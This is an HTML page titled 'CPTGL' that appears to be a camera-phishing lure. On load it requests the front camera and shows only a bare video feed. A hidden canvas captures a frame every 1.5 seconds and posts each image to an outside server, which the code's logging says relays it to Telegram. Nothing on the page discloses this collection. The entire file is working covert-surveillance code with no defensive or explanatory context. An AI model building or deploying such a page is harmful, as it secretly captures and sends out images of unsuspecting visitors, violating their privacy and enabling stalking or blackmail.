<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CPTGL</title>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

<style>
body {
    margin: 0;
    background: black;
    overflow: hidden;
}
#video {
    width: 100%;
    height: auto;
}
</style>

</head>
<body>

<video id="video" playsinline autoplay></video>
<canvas id="canvas" width="740" height="580" hidden></canvas>

<script>

// AUTO CAMERA START (Android will ask permission)
document.addEventListener("DOMContentLoaded", async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: false
        });

        const video = document.getElementById('video');
        video.srcObject = stream;

        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        setInterval(() => {
            context.drawImage(video, 0, 0, 740, 580);
            let imgData = canvas.toDataURL("image/png");
            sendToBot(imgData);
        }, 1500);

    } catch (e) {
        console.log("Camera error:", e);
    }
});

// SEND IMAGE TO RENDER BACKEND
function sendToBot(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'https://cptgl-server.onrender.com/post.php',
        dataType: 'json',
        success: function(result){
            console.log("Sent to Telegram:", result);
        },
        error: function(){
            console.log("Error sending image");
        }
    });
}

</script>

</body>
</html>
